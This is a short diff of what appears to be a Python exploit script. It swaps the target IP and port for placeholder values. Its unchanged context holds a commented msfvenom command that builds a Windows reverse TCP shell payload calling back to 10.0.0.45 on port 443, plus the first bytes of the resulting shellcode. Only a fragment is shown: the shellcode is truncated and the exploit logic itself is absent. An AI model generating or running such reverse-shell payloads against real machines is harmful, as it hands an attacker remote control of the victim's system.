@@ -4,8 +4,8 @@
 
 import socket
 
-victim = "10.0.0.53"
-port = 7003
+victim = "10.0.0.0"
+port = 9999
 
 ## msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.45 LPORT=443 -f py -b '\x00\x3b\x45' -v shellcode
 shellcode = b"\xda\xd2\xd9\x74\x24\xf4\x5e\xbf\xf9\x6f\xaf"
